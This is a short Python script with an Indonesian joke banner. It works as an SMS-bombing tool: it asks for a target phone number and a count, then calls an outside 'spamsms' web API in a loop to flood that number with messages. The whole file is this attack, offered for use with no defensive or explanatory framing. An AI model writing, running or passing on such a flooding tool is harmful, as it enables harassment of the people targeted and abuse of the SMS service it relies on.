import requests , os

def logo():
	print("""

	|SURAT KENANGAN DARI MANTAN|
	|Author : Tegar Fikri Maualana|
	|Judul : judul-judulan|
""")

def Menu():
   os.system('clear')
   logo()
   print("\nMasukan Nomor Di awali (8xxx)")
   nomor = input("Nomor Target :0")
   Jum = int(input("Jumlah : "))
   for i in range(Jum):
        req = requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={"phone":nomor}).text
        if 'Terkirim ' in req:
          print("\nSurat MANTAN Terkirim")
        else:
          print("\nSurat MANTAN Gagal Terkirim")
          os.system('clear')

Menu()
